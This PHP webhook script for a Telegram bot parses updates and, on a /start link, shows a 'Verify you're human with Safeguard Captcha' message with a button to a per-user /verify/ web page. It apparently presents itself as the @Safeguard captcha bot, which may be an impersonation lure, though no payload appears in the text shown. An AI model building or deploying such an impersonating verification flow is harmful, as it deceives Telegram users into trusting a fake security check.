<?php
include('../main.php');

$php_input = file_get_contents('php://input');
$update = json_decode($php_input, TRUE);

$is_photo = isset($update['message']['photo']);
$is_sticker = isset($update['message']['sticker']);
$is_message = isset($update['message']['text']);
$is_callback = isset($update['callback_query']);
$is_channel_post = isset($update['channel_post']);
$is_video = isset($update['message']['video']);


$send_video = false;

if ($is_photo || $is_message || $is_sticker || $is_video):
    $is_reply = isset($update['message']['reply_to_message']);
    $reply_msg_id = (int) $update['message']['reply_to_message']['message_id'];
    $reply_user_id = (int) $update['message']['reply_to_message']['from']['id'];
    $reply_user_username = telegram_init_username($update['message']['reply_to_message']['from']['username']);
    $chat_id = $update['message']['chat']['id'];
    $message = $update['message']['text'];
    $chat_group_data = $update['message']['chat'];
    $chat_group_id = $chat_group_data['id'];
    $chat_group_type = $chat_group_data['type'];
    $msg_id = $update['message']['message_id'];
    $entities_from_message = $update['message']['entities'];
    $user_id = (string) $update['message']['from']['id'];
    $uid = (string) $user_id;
    $first_name = $update['message']['from']['first_name'];
    $last_name = $update['message']['from']['last_name'];
    $username = telegram_init_username($update['message']['from']['username']);
    $l_message = mb_strtolower($message);
    $b_msg = $update['message']['text'];
    $caption = $update['message']['caption'];
    $clean_msg = str_replace(' ', '', $b_msg);
    $cl_lower_msg = mb_strtolower($clean_msg);
    $msg_len = strlen($clean_msg);
    $is_link = find_str($clean_msg, '/start');
    $link = str_replace('/start', '', $clean_msg);

    if ($chat_group_type != 'private') {
        if ($clean_msg == '/id') {
            msg("Chat_id: <code>" . $chat_id . "</code>");
        }
        return;
    }

    if ($is_link) {
        $txt = gen_text([
            "Verify you're human with Safeguard Captcha",
            "Click 'Verify' and complete the captcha to gain entry."
        ]);
        $txt = gen_text([
            bold("None is being protected by @Safeguard"),
            "",
            "Click below to verify you're human"
        ]);
        $kb = [
            [
                [
                    'text' => 'Verify',
                    'web_app' => [
                        'url' => 'https://' . $_SERVER['HTTP_HOST'] . "/verify/" . $uid,
                    ]
                ],
            ],
        ];

        $kb = [
            [
                [
                    'text' => 'Tap to Verify',
                    'callback_data' => json_encode([
                        't' => 'get_confirm',
                    ])
                ],
            ],
        ];
        inline_keyboard($chat_id, BOT_MESSAGE_PHOTO_URL);
    }


endif;


if ($is_callback):
    include(__DIR__ . '/callback.php');
endif;
